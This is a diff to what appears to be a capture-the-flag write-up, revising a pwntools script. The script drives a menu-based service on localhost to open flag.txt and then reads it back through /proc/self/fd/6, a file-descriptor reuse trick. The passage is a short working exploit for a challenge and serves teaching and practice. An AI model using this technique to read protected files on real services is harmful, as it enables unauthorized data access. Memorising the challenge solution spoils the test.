@@ -74,20 +74,28 @@ The `/proc` filesystem is a pseudo-filesystem that provides an interface to kern
 ```python
 from pwn import *
 
-# Connection Setup
+HOST = 'localhost'
+PORT = 4041
+
 conn = remote(HOST, PORT)
 
-# Step 1: Open flag file
-conn.sendline(b'2')  # Open file option
+print(conn.recvuntil(b'Enter choice:').decode())
+conn.sendline(b'2')
+
+print(conn.recvuntil(b'Enter file name:').decode())
 conn.sendline(b'flag.txt')
 
-# Step 2: Access via proc filesystem
+print(conn.recvuntil(b'Enter choice:').decode())
 conn.sendline(b'2')
+
+print(conn.recvuntil(b'Enter file name:').decode())
 conn.sendline(b'/proc/self/fd/6')
 
-# Step 3: Read contents
+print(conn.recvuntil(b'Enter choice:').decode())
 conn.sendline(b'3')
+
 print(conn.recvall().decode())
+
 conn.close()
 ```
 
